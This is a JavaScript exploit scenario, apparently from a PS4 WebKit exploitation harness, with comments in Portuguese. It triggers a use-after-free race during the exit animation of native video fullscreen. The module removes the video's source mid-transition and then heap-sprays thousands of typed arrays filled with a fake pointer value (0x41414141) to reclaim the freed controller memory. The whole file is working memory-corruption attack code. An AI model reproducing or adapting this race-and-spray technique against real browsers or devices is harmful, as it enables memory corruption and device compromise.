/**
 * CENÁRIO: VIDEO_FULLSCREEN_TRANSITION_CRASH
 * Alvo: Race Condition durante a animação de saída (Exit Transition)
 */

export default {
    id:       'VIDEO_FULLSCREEN_TRANSITION_CRASH',
    category: 'Media',
    risk:     'CRITICAL',
    description: 'Evita o UI Deadlock forçando o UAF *durante* a animação de saída. ' +
                 'Garante que o OrbisOS já libertou o ecrã antes de matarmos o WebProcess.',

    setup: async function() {
        this.container = document.createElement('div');
        document.body.appendChild(this.container);
        
        this.video = document.createElement('video');
        this.video.src = 'data:video/mp4;base64,AAAAFGZ0eXBtcDQyAAAAAG1wNDIAAAAIZnJlZQAAAAhtZGF0';
        this.video.controls = true;
        this.container.appendChild(this.video);

        // A nossa munição (Ponteiro Falso)
        this.sprayPayload = new Uint32Array(256);
        this.sprayPayload.fill(0x41414141);

        await new Promise(resolve => {
            const timeout = setTimeout(resolve, 400);
            this.video.addEventListener('loadedmetadata', () => {
                clearTimeout(timeout);
                resolve();
            }, { once: true });
        });
    },

    trigger: async function() {
        try {
            // 1. Entramos em Fullscreen nativo
            if (this.video.webkitEnterFullscreen) {
                this.video.webkitEnterFullscreen();
            } else if (this.video.webkitRequestFullscreen) {
                this.video.webkitRequestFullscreen();
            }
            
            // Aguardamos que a entrada estabilize completamente
            await new Promise(r => setTimeout(r, 500)); 

            // 2. INICIAMOS A SAÍDA (O OrbisOS começa a devolver o ecrã)
            if (document.webkitExitFullscreen) {
                document.webkitExitFullscreen();
            } else if (this.video.webkitExitFullscreen) {
                this.video.webkitExitFullscreen();
            }

            // 3. A JANELA DE TRANSIÇÃO (A Mágica)
            // Esperamos 50ms. O ecrã da PS4 já começou a encolher e o menu já está a reaparecer.
            // O OrbisOS já não vai congelar.
            await new Promise(r => setTimeout(r, 50)); 

            // 4. O GATILHO & SPRAY
            // O FullscreenVideoController C++ ainda está na memória a limpar variáveis finais.
            // Nós arrancamos o motor do player e enchemos o buraco!
            this.video.removeAttribute('src');
            this.video.load();

            this.spray = [];
            for (let i = 0; i < 5000; i++) {
                let arr = new Uint32Array(256);
                arr.set(this.sprayPayload);
                this.spray.push(arr);
            }

        } catch(e) {}
    },

    probe: [
        s => s.video.readyState,
        s => s.video.webkitDecodedFrameCount
    ],

    cleanup: function() {
        try { this.container.remove(); } catch(e) {}
        this.spray = null;
        this.video = null;
    }
};
